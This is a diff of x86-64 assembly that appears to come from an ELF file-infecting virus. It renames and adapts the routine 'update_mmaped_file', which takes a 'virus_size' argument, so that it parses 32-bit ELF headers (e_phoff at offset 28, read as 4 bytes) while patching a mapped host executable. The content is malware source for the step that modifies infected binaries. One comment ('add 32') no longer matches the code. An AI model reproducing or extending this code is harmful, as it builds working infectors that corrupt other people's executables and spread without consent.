@@ -29,14 +29,14 @@
 ;; ---------------------------------------------------
 
 section .text
-	global _update_mmaped_file
+	global _update_mmaped_file32
 	extern _string
 
 ;; ---------------------------------------------------
 ;; Re-mmap and update file
-;;		update_mmaped_file(void *mmap_base_address, long file_size, long virus_size, long fd)
+;;		update_mmaped_file32(void *mmap_base_address, long file_size, long virus_size, long fd)
 ;; ---------------------------------------------------
-_update_mmaped_file:
+_update_mmaped_file32:
 	enter 256, 0
 	;; ---------------------------------------------------
 	;; Stack usage
@@ -69,9 +69,9 @@ _update_mmaped_file:
 ; init phdr (ehdr + ehdr->e_phoff)
 	mov r10, QWORD [rsp] ; take the mmap_base_address
 	mov QWORD [rsp + 32], r10 ; store it on stack
-	add QWORD [rsp + 32], 32 ; add 32 on the address (offset on the header for e_phoff)
+	add QWORD [rsp + 32], 28 ; add 32 on the address (offset on the header for e_phoff)
 	mov r10, QWORD [rsp + 32] ; take this address
-	mov r10, QWORD [r10] ; dereference it to take the value
+	mov r10d, DWORD [r10] ; dereference it to take the value (4 bytes)
 	mov QWORD [rsp + 32], r10 ; mov it on stack
 	mov r10, QWORD [rsp] ; take the mmap_base_address
 	add QWORD [rsp + 32], r10 ; add it to our offset
